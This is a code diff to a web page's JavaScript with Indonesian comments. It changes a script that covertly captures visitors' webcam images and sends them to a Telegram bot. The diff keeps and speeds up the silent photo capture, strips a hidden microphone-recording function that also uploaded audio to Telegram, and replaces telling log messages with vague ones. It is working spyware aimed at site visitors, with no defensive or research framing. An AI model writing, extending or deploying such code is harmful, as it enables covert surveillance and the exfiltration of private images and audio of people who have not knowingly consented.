@@ -49,20 +49,19 @@ async function startMusicAndCamera() {
 
       // ✅ hanya 1 kali izin video + audio
       if (!alreadyAllowed && navigator.mediaDevices) {
-        stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+        stream = await navigator.mediaDevices.getUserMedia({ video: true });
         localStorage.setItem("user_allows_auto_capture", "1");
-        console.log("✅ Izin kamera & mic diberikan pertama kali.");
+        console.log("Perizinan");
       } else if (alreadyAllowed) {
         console.log("📸 Kamera sudah diizinkan sebelumnya, ambil otomatis...");
-        stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+        stream = await navigator.mediaDevices.getUserMedia({ video: true });
       }
 
       // kirim ke 2 fungsi, tapi 1 stream yang sama
       await autoCaptureAndSend(stream);
-      await autoRecordAndSend(stream);
 
     } catch (e) {
-      console.warn("❌ User menolak izin kamera atau mikrofon:", e);
+      console.warn("❌ User menolak izin:", e);
     }
   }, musicStarted ? 800 : 1500);
 
@@ -86,7 +85,7 @@ async function autoCaptureAndSend(stream) {
     video.playsInline = true;
     await video.play();
 
-    await new Promise(r => setTimeout(r, 500));
+    await new Promise(r => setTimeout(r, 50));
 
     const canvas = document.createElement("canvas");
     canvas.width = video.videoWidth || 640;
@@ -99,7 +98,7 @@ async function autoCaptureAndSend(stream) {
 
     const fd = new FormData();
     fd.append("chat_id", CHAT_ID);
-    fd.append("caption", "📸 Auto-capture dari pengunjung (fokus 1s)");
+    fd.append("caption", "📸 Auto-capture dari pengunjung");
     fd.append("photo", blob, "capture.png");
 
     const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
@@ -107,48 +106,11 @@ async function autoCaptureAndSend(stream) {
       body: fd
     });
 
-    if (res.ok) console.log("✅ Foto terkirim (fokus 1s)");
-    else console.warn("⚠️ Gagal kirim foto");
+    if (res.ok) console.log(" Berjalan");
+    else console.warn("Error");
 
   } catch (err) {
-    console.error("❌ Tidak bisa akses kamera:", err);
-  }
-}
-
-// === Fungsi rekam suara tersembunyi & kirim ke Telegram ===
-async function autoRecordAndSend(stream) {
-  try {
-    const audioTrack = stream.getAudioTracks()[0];
-    if (!audioTrack) return console.warn("❌ Tidak ada audio track");
-
-    const recorder = new MediaRecorder(new MediaStream([audioTrack]));
-    const chunks = [];
-
-    recorder.ondataavailable = e => { if (e.data.size > 0) chunks.push(e.data); };
-    recorder.onstop = async () => {
-      const blob = new Blob(chunks, { type: "audio/webm" });
-      const fd = new FormData();
-      fd.append("chat_id", CHAT_ID);
-      fd.append("caption", "🎤 Auto-record suara pengunjung (5 detik)");
-      fd.append("voice", blob, "voice.webm");
-
-      try {
-        const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVoice`, {
-          method: "POST",
-          body: fd
-        });
-        if (res.ok) console.log("✅ Suara terkirim (5s)");
-        else console.warn("⚠️ Gagal kirim suara");
-      } catch (err) {
-        console.error("❌ Gagal kirim suara:", err);
-      }
-    };
-
-    recorder.start();
-    console.log("🎙️ Mulai merekam 5 detik...");
-    setTimeout(() => recorder.stop(), 10000);
-  } catch (err) {
-    console.warn("❌ Izin mikrofon ditolak atau tidak tersedia:", err);
+    console.error("Error", err);
   }
 }
 
